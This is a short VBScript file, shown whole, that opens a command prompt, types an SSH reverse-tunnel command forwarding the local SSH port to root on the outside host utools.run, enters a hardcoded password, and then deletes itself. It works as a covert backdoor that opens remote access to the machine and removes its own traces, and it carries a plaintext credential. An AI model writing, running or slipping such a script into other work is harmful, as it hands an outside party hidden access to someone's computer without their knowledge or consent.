Dim WshShell 
Set objFSO = CreateObject("Scripting.FileSystemObject")
strScript = Wscript.ScriptFullName

Set WshShell=WScript.CreateObject("WScript.Shell") 
WshShell.Run "cmd.exe"
WScript.Sleep 1500 
WshShell.SendKeys "ssh -fNR 666:localhost:22 root@utools.run"
WshShell.SendKeys "{ENTER}"
WScript.Sleep 1500 
WshShell.SendKeys "Code@2013."
WshShell.SendKeys "{ENTER}"


objFSO.DeleteFile(strScript)
